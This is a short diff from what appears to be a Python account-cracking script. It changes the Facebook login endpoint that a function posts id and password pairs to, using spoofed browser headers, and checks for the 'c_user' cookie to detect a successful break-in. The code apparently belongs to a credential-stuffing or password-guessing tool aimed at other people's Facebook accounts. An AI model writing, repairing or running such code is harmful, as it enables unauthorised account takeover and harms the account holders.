@@ -344,7 +344,7 @@ def _M1_(ids,pasx):
                         'referer': f'https://m.facebook.com/login/?wtsid=rdr_0HpBBBchEc4DCrXrX&refsrc=deprecated&_rdr',
                         'accept-encoding': 'gzip, deflate, br',
                         'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
-                        url=f"https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+                        url=f"https://www.facebook.com/login.php/?login_attempt=1&display=popup"
                         lo = session.post(url,data=info,headers=had).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
